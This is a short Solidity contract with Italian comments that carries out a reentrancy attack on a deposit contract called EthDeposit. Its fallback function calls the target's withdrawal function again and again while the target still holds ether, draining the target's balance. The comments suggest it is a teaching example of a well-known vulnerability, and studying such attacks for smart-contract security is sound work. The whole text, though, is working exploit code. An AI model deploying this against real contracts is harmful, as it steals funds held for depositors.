   contract Attacker {
    //si crea un istanza di un contratto EthDeposit
    EthDeposit public vulnerabile;
    //il contratto d'attacco si inizializza
    // con l'indirizzo di quello vulnerabile
    constructor(address indirizzo) {
        //si setta l'istanza tramite il suo indirizzo
        vulnerabile = EthDeposit(indirizzo);
    }

    // chiamata quando si ha almeno un ether nel deposito
    fallback() external payable {
        if (address(vulnerabile).balance >= 1 ether) {
            vulnerabile.ritira();
        }
    }
    //l'attacco consiste nell'inviare esattamente 1 eth e ritirare subito dopo
    //per attivare la funzione di fallback
    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerabile.deposita{value: 1 ether}();
        vulnerabile.ritira();
    }
}